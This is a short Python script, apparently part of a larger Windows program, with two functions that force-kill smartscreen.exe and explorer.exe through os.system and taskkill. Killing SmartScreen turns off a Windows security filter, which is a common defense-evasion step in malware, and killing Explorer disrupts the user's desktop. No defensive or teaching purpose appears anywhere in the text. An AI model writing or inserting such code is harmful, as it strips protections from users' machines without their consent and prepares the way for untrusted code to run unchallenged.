#!/usr/bin/python
#coding:utf-8
import os, sys
# Function to kill a process with force option (this function used in the main program)
def smart():
    try:
        killed = "taskkill /IM smartscreen.exe /F"
        os.system(killed)
    except Exception:
        killed = 0
    return killed

def exp():
    try:
        killed = "taskkill /IM explorer.exe /F"
        os.system(killed)
    except Exception:
        killed = 0
    return killed
